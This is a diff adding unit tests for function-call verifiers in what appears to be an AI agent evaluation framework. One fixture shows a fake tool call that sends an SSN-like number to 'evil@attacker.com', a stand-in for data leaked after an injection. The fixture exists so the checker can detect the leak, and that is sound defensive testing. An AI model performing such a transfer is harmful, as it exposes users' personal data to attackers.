@@ -3,6 +3,7 @@ from pydantic import BaseModel
 
 from midojo.types import Environment
 from midojo.verifier import VerificationContext
+from midojo.types import FunctionCallRecord
 from midojo.verifiers.builtin import (
     AllOf,
     AnyOf,
@@ -11,6 +12,8 @@ from midojo.verifiers.builtin import (
     EnvFieldUnchanged,
     EnvListAnyMatch,
     EnvListCount,
+    FunctionCallArgContains,
+    FunctionCalled,
     Not,
     OutputContains,
     OutputContainsAll,
@@ -312,3 +315,96 @@ class TestParsePredicate:
     def test_empty_dict_raises(self):
         with pytest.raises(ValueError, match="exactly one key"):
             parse_predicate({})
+
+
+# --- Function call predicates ---
+
+
+def _make_fc(function: str, args: dict | None = None, result: str = "ok") -> FunctionCallRecord:
+    return FunctionCallRecord(
+        function=function,
+        args=args or {},
+        result=result,
+        timestamp="2025-01-01T00:00:00",
+        pre_environment=EmptyEnv(),
+        post_environment=EmptyEnv(),
+    )
+
+
+def _ctx_with_calls(*calls: FunctionCallRecord) -> VerificationContext:
+    return VerificationContext(
+        agent_output="",
+        pre_environment=EmptyEnv(),
+        post_environment=EmptyEnv(),
+        function_calls=list(calls),
+    )
+
+
+class TestFunctionCalled:
+    def test_true_when_called(self):
+        ctx = _ctx_with_calls(_make_fc("send_notification"))
+        assert FunctionCalled(function="send_notification").evaluate(ctx) is True
+
+    def test_false_when_not_called(self):
+        ctx = _ctx_with_calls(_make_fc("get_weather"))
+        assert FunctionCalled(function="send_notification").evaluate(ctx) is False
+
+    def test_false_with_no_calls(self):
+        ctx = _ctx_with_calls()
+        assert FunctionCalled(function="send_notification").evaluate(ctx) is False
+
+    def test_matches_among_multiple_calls(self):
+        ctx = _ctx_with_calls(
+            _make_fc("get_weather"),
+            _make_fc("send_notification"),
+            _make_fc("get_balance"),
+        )
+        assert FunctionCalled(function="send_notification").evaluate(ctx) is True
+
+    def test_assess_returns_reason(self):
+        ctx = _ctx_with_calls(_make_fc("send_notification"))
+        result = FunctionCalled(function="send_notification").assess(ctx)
+        assert result.passed is True
+        assert "send_notification" in result.reason
+
+    def test_parsed_from_yaml(self):
+        predicate = parse_predicate({"function_called": "send_notification"})
+        assert isinstance(predicate, FunctionCalled)
+        ctx = _ctx_with_calls(_make_fc("send_notification"))
+        assert predicate.evaluate(ctx) is True
+
+
+class TestFunctionCallArgContains:
+    def test_true_when_arg_contains_value(self):
+        ctx = _ctx_with_calls(_make_fc("send_notification", {"recipient": "evil@attacker.com", "message": "SSN: 123-45-6789"}))
+        pred = FunctionCallArgContains(tool="send_notification", arg="message", value="123-45-6789")
+        assert pred.evaluate(ctx) is True
+
+    def test_false_when_arg_missing(self):
+        ctx = _ctx_with_calls(_make_fc("send_notification", {"recipient": "user@bank.com"}))
+        pred = FunctionCallArgContains(tool="send_notification", arg="message", value="SSN")
+        assert pred.evaluate(ctx) is False
+
+    def test_false_when_wrong_tool(self):
+        ctx = _ctx_with_calls(_make_fc("get_weather", {"message": "123-45-6789"}))
+        pred = FunctionCallArgContains(tool="send_notification", arg="message", value="123-45-6789")
+        assert pred.evaluate(ctx) is False
+
+    def test_case_insensitive(self):
+        ctx = _ctx_with_calls(_make_fc("send_notification", {"message": "Contains SSN Data"}))
+        pred = FunctionCallArgContains(tool="send_notification", arg="message", value="ssn data")
+        assert pred.evaluate(ctx) is True
+
+    def test_assess_returns_reason(self):
+        ctx = _ctx_with_calls(_make_fc("send_notification", {"message": "SSN: 123"}))
+        result = FunctionCallArgContains(tool="send_notification", arg="message", value="123").assess(ctx)
+        assert result.passed is True
+        assert "123" in result.reason
+
+    def test_parsed_from_yaml(self):
+        predicate = parse_predicate({
+            "function_call_arg_contains": {"tool": "send_notification", "arg": "message", "value": "SSN"},
+        })
+        assert isinstance(predicate, FunctionCallArgContains)
+        ctx = _ctx_with_calls(_make_fc("send_notification", {"message": "Contains SSN"}))
+        assert predicate.evaluate(ctx) is True
